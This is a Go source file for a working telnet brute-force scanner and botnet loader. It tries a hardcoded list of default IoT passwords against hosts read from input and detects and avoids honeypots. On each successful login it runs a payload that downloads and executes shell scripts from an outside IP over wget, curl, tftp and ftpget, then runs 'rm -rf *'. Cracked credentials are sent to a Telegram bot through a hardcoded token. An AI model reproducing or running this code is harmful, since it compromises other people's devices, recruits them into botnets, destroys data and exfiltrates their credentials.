package main

import (
        "bufio"
        "bytes"
        "encoding/json"
        "fmt"
        "io"
        "mime/multipart"
        "net"
        "net/http"
        "os"
        "runtime"
        "strings"
        "sync"
        "sync/atomic"
        "time"
)

var CREDENTIALS = []struct {
        Username string
        Password string
}{
        {"root", "root"},
        {"root", ""},
        {"root", "icatch99"},
        {"admin", "admin"},
        {"user", "user"},
        {"admin", "VnT3ch@dm1n"},
        {"telnet", "telnet"},
        {"root", "86981198"},
        {"admin", "password"},
        {"admin", ""},
        {"guest", "guest"},
        {"admin", "1234"},
        {"root", "1234"},
        {"pi", "raspberry"},
        {"support", "support"},
        {"ubnt", "ubnt"},
        {"admin", "123456"},
        {"root", "toor"},
        {"admin", "admin123"},
        {"service", "service"},
        {"tech", "tech"},
        {"cisco", "cisco"},
        {"user", "password"},
        {"root", "password"},
        {"root", "admin"},
        {"admin", "admin1"},
        {"root", "123456"},
        {"root", "pass"},
        {"admin", "pass"},
        {"administrator", "password"},
        {"administrator", "admin"},
        {"root", "default"},
        {"admin", "default"},
        {"root", "vizxv"},
        {"admin", "vizxv"},
        {"root", "xc3511"},
        {"admin", "xc3511"},
        {"root", "admin1234"},
        {"admin", "admin1234"},
        {"root", "anko"},
        {"admin", "anko"},
        {"admin", "system"},
        {"root", "system"},
        {"root", "realtek"},
        {"root", "Zte521"},
        {"admin", "tl7u4p"},
        {"root", "juantech"},
        {"root", "oxhlwz"},
        {"admin", "smcadmin"},
        {"root", "cat1029"},
        {"root", "hi3518"},
        {"root", "klv123"},
        {"root", "klv1234"},
        {"root", "12345"},
        {"root", "666666"},
        {"root", "7ujMko0vizxv"},
        {"root", "7ujMko0admin"},
        {"admin", "meinsm"},
        {"tech", "tech"},
        {"supervisor", "supervisor"},
        {"operator", "operator"},
        {"root", "dreambox"},
        {"admin", "1111"},
        {"admin", "1111111"},
        {"admin", "00000000"},

}

const (
        TELNET_TIMEOUT  = 2 * time.Second
        MAX_WORKERS     = 2000
        PAYLOAD         = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://154.53.50.130/1.sh; curl -O http://154.53.50.130/1.sh; chmod 777 1.sh; sh 1.sh; tftp 154.53.50.130 -c get 1.sh; chmod 777 1.sh; sh 1.sh; tftp -r 3.sh -g 154.53.50.130; chmod 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -P 21 154.53.50.130 2.sh 2.sh; sh 2.sh; rm -rf 1.sh 1.sh 3.sh 2.sh; rm -rf *"
        STATS_INTERVAL  = 1 * time.Second
        MAX_QUEUE_SIZE  = 100000
        CONNECT_TIMEOUT = 1 * time.Second
        TELEGRAM_BOT_TOKEN = "8183155028:AAH2iJlMNydW3igennVQPma4bESnKd54oMk"
        TELEGRAM_CHAT_ID   = "-5291991953"
)

type CredentialResult struct {
        Host     string
        Username string
        Password string
        Output   string
        Honeypot bool
        Reasons  []string
}

type TelnetScanner struct {
        lock             sync.Mutex
        scanned          int64
        valid            int64
        invalid          int64
        honeypot         int64
        foundCredentials []CredentialResult
        hostQueue        chan string
        done             chan bool
        wg               sync.WaitGroup
        queueSize        int64
}

var BANNERS_AFTER_LOGIN = []string{
        "[admin@localhost ~]$",
        "[admin@localhost ~]#",
        "[admin@localhost tmp]$",
        "[admin@localhost tmp]#",
        "[admin@localhost /]$",
        "[admin@localhost /]#",
        "[admin@LocalHost ~]$",
        "[admin@LocalHost ~]#",
        "[admin@LocalHost tmp]$",
        "[admin@LocalHost tmp]#",
        "[admin@LocalHost /]$",
        "[admin@LocalHost /]#",
        "[administrator@localhost ~]$",
        "[administrator@localhost ~]#",
        "[administrator@localhost tmp]$",
        "[administrator@localhost tmp]#",
        "[administrator@localhost /]$",
        "[administrator@localhost /]#",
        "[administrator@LocalHost ~]$",
        "[administrator@LocalHost ~]#",
        "[administrator@LocalHost tmp]$",
        "[administrator@LocalHost tmp]#",
        "[administrator@LocalHost /]$",
        "[administrator@LocalHost /]#",
        "[cisco@localhost ~]$",
        "[cisco@localhost ~]#",
        "[cisco@localhost tmp]$",
        "[cisco@localhost tmp]#",
        "[cisco@localhost /]$",
        "[cisco@localhost /]#",
        "[cisco@LocalHost ~]$",
        "[cisco@LocalHost ~]#",
        "[cisco@LocalHost tmp]$",
        "[cisco@LocalHost tmp]#",
        "[cisco@LocalHost /]$",
        "[cisco@LocalHost /]#",
        "[pi@raspberrypi ~]$",
        "[pi@raspberrypi ~]#",
        "[pi@raspberrypi tmp]$",
        "[pi@raspberrypi tmp]#",
        "[pi@raspberrypi /]$",
        "[pi@raspberrypi /]#",
        "[pi@localhost ~]$",
        "[pi@localhost ~]#",
        "[pi@localhost tmp]$",
        "[pi@localhost tmp]#",
        "[pi@localhost /]$",
        "[pi@localhost /]#",
        "[pi@LocalHost ~]$",
        "[pi@LocalHost ~]#",
        "[pi@LocalHost tmp]$",
        "[pi@LocalHost tmp]#",
        "[pi@LocalHost /]$",
        "[pi@LocalHost /]#",
        "[root@LocalHost ~]$",
        "[root@LocalHost ~]#",
        "[root@LocalHost tmp]$",
        "[root@LocalHost tmp]#",
        "[root@LocalHost /]$",
        "[root@LocalHost /]#",
        "[root@localhost ~]$",
        "[root@localhost ~]#",
        "[root@localhost tmp]$",
        "[root@localhost tmp]#",
        "[root@localhost /]$",
        "[root@localhost /]#",
        "[ubnt@localhost ~]$",
        "[ubnt@localhost ~]#",
        "[ubnt@localhost tmp]$",
        "[ubnt@localhost tmp]#",
        "[ubnt@localhost /]$",
        "[ubnt@localhost /]#",
        "[ubnt@LocalHost ~]$",
        "[ubnt@LocalHost ~]#",
        "[ubnt@LocalHost tmp]$",
        "[ubnt@LocalHost tmp]#",
        "[ubnt@LocalHost /]$",
        "[ubnt@LocalHost /]#",
        "[user@localhost ~]$",
        "[user@localhost ~]#",
        "[user@localhost tmp]$",
        "[user@localhost tmp]#",
        "[user@localhost /]$",
        "[user@localhost /]#",
        "[user@LocalHost ~]$",
        "[user@LocalHost ~]#",
        "[user@LocalHost tmp]$",
        "[user@LocalHost tmp]#",
        "[user@LocalHost /]$",
        "[user@LocalHost /]#",
        "[guest@localhost ~]$",
        "[guest@localhost ~]#",
        "[guest@localhost tmp]$",
        "[guest@localhost tmp]#",
        "[guest@localhost /]$",
        "[guest@localhost /]#",
        "[guest@LocalHost ~]$",
        "[guest@LocalHost ~]#",
        "[guest@LocalHost tmp]$",
        "[guest@LocalHost tmp]#",
        "[guest@LocalHost /]$",
        "[guest@LocalHost /]#",
        "[support@localhost ~]$",
        "[support@localhost ~]#",
        "[support@localhost tmp]$",
        "[support@localhost tmp]#",
        "[support@localhost /]$",
        "[support@localhost /]#",
        "[support@LocalHost ~]$",
        "[support@LocalHost ~]#",
        "[support@LocalHost tmp]$",
        "[support@LocalHost tmp]#",
        "[support@LocalHost /]$",
        "[support@LocalHost /]#",
        "[service@localhost ~]$",
        "[service@localhost ~]#",
        "[service@localhost tmp]$",
        "[service@localhost tmp]#",
        "[service@localhost /]$",
        "[service@localhost /]#",
        "[service@LocalHost ~]$",
        "[service@LocalHost ~]#",
        "[service@LocalHost tmp]$",
        "[service@LocalHost tmp]#",
        "[service@LocalHost /]$",
        "[service@LocalHost /]#",
        "[tech@localhost ~]$",
        "[tech@localhost ~]#",
        "[tech@localhost tmp]$",
        "[tech@localhost tmp]#",
        "[tech@localhost /]$",
        "[tech@localhost /]#",
        "[tech@LocalHost ~]$",
        "[tech@LocalHost ~]#",
        "[tech@LocalHost tmp]$",
        "[tech@LocalHost tmp]#",
        "[tech@LocalHost /]$",
        "[tech@LocalHost /]#",
        "[telnet@localhost ~]$",
        "[telnet@localhost ~]#",
        "[telnet@localhost tmp]$",
        "[telnet@localhost tmp]#",
        "[telnet@localhost /]$",
        "[telnet@localhost /]#",
        "[telnet@LocalHost ~]$",
        "[telnet@LocalHost ~]#",
        "[telnet@LocalHost tmp]$",
        "[telnet@LocalHost tmp]#",
        "[telnet@LocalHost /]$",
        "[telnet@LocalHost /]#",
}

var BANNERS_BEFORE_LOGIN = []string{
        "honeypot",
        "honeypots",
        "cowrie",
        "kippo",
        "dionaea",
        "glastopf",
        "conpot",
        "heralding",
        "snare",
        "tanner",
        "wordpot",
        "shockpot",
        "honeyd",
        "honeytrap",
        "nepenthes",
        "amun",
        "beeswarm",
        "mwcollect",
        "opencanary",
        "canary",
        "thinkst",
        "splunk",
        "splunkd",
}

// Telegram API functions
func sendTelegramMessage(message string) error {
        url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TELEGRAM_BOT_TOKEN)

        payload := map[string]interface{}{
                "chat_id":    TELEGRAM_CHAT_ID,
                "text":       message,
                "parse_mode": "HTML",
        }

        jsonData, err := json.Marshal(payload)
        if err != nil {
                return err
        }

        resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
        if err != nil {
                return err
        }
        defer resp.Body.Close()

        return nil
}

func sendTelegramDocument(filePath, caption string) error {
        url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", TELEGRAM_BOT_TOKEN)

        file, err := os.Open(filePath)
        if err != nil {
                return err
        }
        defer file.Close()

        body := &bytes.Buffer{}
        writer := multipart.NewWriter(body)

        writer.WriteField("chat_id", TELEGRAM_CHAT_ID)
        if caption != "" {
                writer.WriteField("caption", caption)
                writer.WriteField("parse_mode", "HTML")
        }

        part, err := writer.CreateFormFile("document", filePath)
        if err != nil {
                return err
        }

        _, err = io.Copy(part, file)
        if err != nil {
                return err
        }

        err = writer.Close()
        if err != nil {
                return err
        }

        req, err := http.NewRequest("POST", url, body)
        if err != nil {
                return err
        }
        req.Header.Set("Content-Type", writer.FormDataContentType())

        client := &http.Client{}
        resp, err := client.Do(req)
        if err != nil {
                return err
        }
        defer resp.Body.Close()

        return nil
}

func formatValidMessage(host, username, password, output string) string {
        timestamp := time.Now().Format("2006-01-02 15:04:05")

        message := fmt.Sprintf(
                "🔥 <b>Valid Telnet Login Found!</b>\n\n"+
                        "🌐 <b>IP:Port:</b> <code>%s:23</code>\n"+
                        "👤 <b>Username:</b> <code>%s</code>\n"+
                        "🔑 <b>Password:</b> <code>%s</code>\n"+
                        "⏰ <b>Time:</b> <code>%s</code>\n\n"+
                        "📝 <b>Output:</b>\n<pre>%s</pre>",
                host, username, password, timestamp, escapeHTML(output))

        return message
}

func formatHoneypotMessage(host, username, password, output string, reasons []string) string {
        timestamp := time.Now().Format("2006-01-02 15:04:05")

        reasonText := "Unknown"
        if len(reasons) > 0 {
                reasonText = strings.Join(reasons, ", ")
        }

        message := fmt.Sprintf(
                "⚠️ <b>Honeypot/Blocked Target</b>\n\n"+
                        "🌐 <b>IP:Port:</b> <code>%s:23</code>\n"+
                        "👤 <b>Username:</b> <code>%s</code>\n"+
                        "🔑 <b>Password:</b> <code>%s</code>\n"+
                        "⏰ <b>Time:</b> <code>%s</code>\n\n"+
                        "🚨 <b>Reasons:</b>\n<pre>%s</pre>\n\n"+
                        "📝 <b>Output:</b>\n<pre>%s</pre>",
                host, username, password, timestamp, escapeHTML(reasonText), escapeHTML(output))

        return message
}

func escapeHTML(s string) string {
        s = strings.ReplaceAll(s, "&", "&amp;")
        s = strings.ReplaceAll(s, "<", "&lt;")
        s = strings.ReplaceAll(s, ">", "&gt;")
        return s
}

func sendValidTelegram(host, username, password, output string) {
        message := formatValidMessage(host, username, password, output)

        err := sendTelegramMessage(message)
        if err != nil {
                fmt.Println("[!] Failed to send Telegram message:", err)
        }

        // Send file if exists
        if _, err := os.Stat("valid.txt"); err == nil {
                err = sendTelegramDocument("valid.txt", "📄 Valid credentials list")
                if err != nil {
                        fmt.Println("[!] Failed to send valid.txt:", err)
                }
        }
}

func sendHoneypotTelegram(host, username, password, output string, reasons []string) {
        message := formatHoneypotMessage(host, username, password, output, reasons)

        err := sendTelegramMessage(message)
        if err != nil {
                fmt.Println("[!] Failed to send Telegram message:", err)
        }

        // Send file if exists
        if _, err := os.Stat("honeypot.txt"); err == nil {
                err = sendTelegramDocument("honeypot.txt", "📄 Honeypot list")
                if err != nil {
                        fmt.Println("[!] Failed to send honeypot.txt:", err)
                }
        }
}

func NewTelnetScanner() *TelnetScanner {
        runtime.GOMAXPROCS(runtime.NumCPU())
        return &TelnetScanner{
                hostQueue:        make(chan string, MAX_QUEUE_SIZE),
                done:             make(chan bool),
                foundCredentials: make([]CredentialResult, 0),
        }
}

func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interface{}) {
        dialer := &net.Dialer{Timeout: CONNECT_TIMEOUT}
        conn, err := dialer.Dial("tcp", host+":23")
        if err != nil {
                return false, "connection failed"
        }
        defer conn.Close()

        conn.SetDeadline(time.Now().Add(TELNET_TIMEOUT))

        data := make([]byte, 0, 1024)
        buf := make([]byte, 1024)
        loginPrompts := [][]byte{[]byte("login:"), []byte("Login:"), []byte("username:"), []byte("Username:")}
        passwordPrompts := [][]byte{[]byte("Password:"), []byte("password:")}
        shellPrompts := [][]byte{[]byte("$ "), []byte("# "), []byte("> "), []byte("sh-"), []byte("bash-")}

        promptCheck := func(data []byte, prompts ...[]byte) bool {
                for _, prompt := range prompts {
                        if bytes.Contains(data, prompt) {
                                return true
                        }
                }
                return false
        }

        startTime := time.Now()
        for !promptCheck(data, loginPrompts...) {
                if time.Since(startTime) > TELNET_TIMEOUT {
                        return false, "login prompt timeout"
                }
                conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
                n, _ := conn.Read(buf)
                if n == 0 {
                        conn.Write([]byte("\n"))
                        continue
                }
                data = append(data, buf[:n]...)

                lowerData := bytes.ToLower(data)
                for _, sb := range BANNERS_BEFORE_LOGIN {
                        if bytes.Contains(lowerData, bytes.ToLower([]byte(sb))) {
                                return true, CredentialResult{Host: host, Username: username, Password: password, Output: string(data), Honeypot: true, Reasons: []string{"BANNER_PRELOGIN:" + sb}}
                        }
                }
        }
        conn.Write([]byte(username + "\n"))

        data = data[:0]
        startTime = time.Now()
        for !promptCheck(data, passwordPrompts...) {
                if time.Since(startTime) > TELNET_TIMEOUT {
                        return false, "password prompt timeout"
                }
                conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
                n, _ := conn.Read(buf)
                if n == 0 {
                        continue
                }
                data = append(data, buf[:n]...)
        }
        conn.Write([]byte(password + "\n"))

        data = data[:0]
        startTime = time.Now()
        for time.Since(startTime) < TELNET_TIMEOUT {
                conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
                n, _ := conn.Read(buf)
                if n == 0 {
                        conn.Write([]byte("\n"))
                        continue
                }
                data = append(data, buf[:n]...)
                if promptCheck(data, shellPrompts...) {
                        for _, sb := range BANNERS_AFTER_LOGIN {
                                if bytes.Contains(data, []byte(sb)) {
                                        return true, CredentialResult{Host: host, Username: username, Password: password, Output: string(data), Honeypot: true, Reasons: []string{"BANNER_AFTER_LOGIN:" + sb}}
                                }
                        }

                        conn.Write([]byte(PAYLOAD + "\n"))
                        output := s.readCommandOutput(conn)
                        return true, CredentialResult{Host: host, Username: username, Password: password, Output: output, Honeypot: false}
                }
        }
        return false, "no shell prompt"
}

func (s *TelnetScanner) readCommandOutput(conn net.Conn) string {
        data := make([]byte, 0, 1024)
        buf := make([]byte, 1024)
        startTime := time.Now()
        for time.Since(startTime) < TELNET_TIMEOUT/2 {
                conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
                n, _ := conn.Read(buf)
                if n == 0 {
                        continue
                }
                data = append(data, buf[:n]...)
        }
        return string(data)
}

func (s *TelnetScanner) worker() {
        defer s.wg.Done()
        for host := range s.hostQueue {
                atomic.AddInt64(&s.queueSize, -1)
                found := false
                for _, cred := range CREDENTIALS {
                        success, result := s.tryLogin(host, cred.Username, cred.Password)
                        if success {
                                credResult := result.(CredentialResult)
                                if credResult.Honeypot {
                                        atomic.AddInt64(&s.honeypot, 1)
                                        fh, _ := os.OpenFile("honeypot.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
                                        fmt.Fprintf(fh, "%s:23 %s:%s\n", credResult.Host, credResult.Username, credResult.Password)
                                        fh.Close()

                                        sendHoneypotTelegram(
                                                credResult.Host,
                                                credResult.Username,
                                                credResult.Password,
                                                credResult.Output,
                                                credResult.Reasons,
                                        )
                                } else {
                                        atomic.AddInt64(&s.valid, 1)
                                        f, _ := os.OpenFile("valid.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
                                        fmt.Fprintf(f, "%s:23 %s:%s\n", credResult.Host, credResult.Username, credResult.Password)
                                        f.Close()

                                        sendValidTelegram(credResult.Host, credResult.Username, credResult.Password, credResult.Output)
                                }

                                found = true
                                break
                        }
                }
                if !found {
                        atomic.AddInt64(&s.invalid, 1)
                }
                atomic.AddInt64(&s.scanned, 1)
        }
}

func (s *TelnetScanner) statsThread() {
        ticker := time.NewTicker(STATS_INTERVAL)
        defer ticker.Stop()
        for {
                select {
                case <-s.done:
                        return
                case <-ticker.C:
                        fmt.Printf("\rtotal: %d | valid: %d | invalid: %d | honeypot: %d | queue: %d | routines: %d",
                                atomic.LoadInt64(&s.scanned),
                                atomic.LoadInt64(&s.valid),
                                atomic.LoadInt64(&s.invalid),
                                atomic.LoadInt64(&s.honeypot),
                                atomic.LoadInt64(&s.queueSize),
                                runtime.NumGoroutine())
                }
        }
}

func (s *TelnetScanner) Run() {
        fmt.Printf("Initializing scanner (%d / %d)...\n", MAX_WORKERS, MAX_QUEUE_SIZE)
        go s.statsThread()
        stdinDone := make(chan bool)
        go func() {
                reader := bufio.NewReader(os.Stdin)
                for {
                        line, err := reader.ReadString('\n')
                        if err != nil {
                                break
                        }
                        host := line[:len(line)-1]
                        if host != "" {
                                atomic.AddInt64(&s.queueSize, 1)
                                s.hostQueue <- host
                        }
                }
                stdinDone <- true
        }()
        for i := 0; i < MAX_WORKERS; i++ {
                s.wg.Add(1)
                go s.worker()
        }
        <-stdinDone
        close(s.hostQueue)
        s.wg.Wait()
        s.done <- true
}

func main() {
        fmt.Println("\n🤖 Telnet Scanner with Telegram Bot")
        fmt.Printf("📢 Channel ID: %s\n\n", TELEGRAM_CHAT_ID)
        scanner := NewTelnetScanner()
        scanner.Run()
}
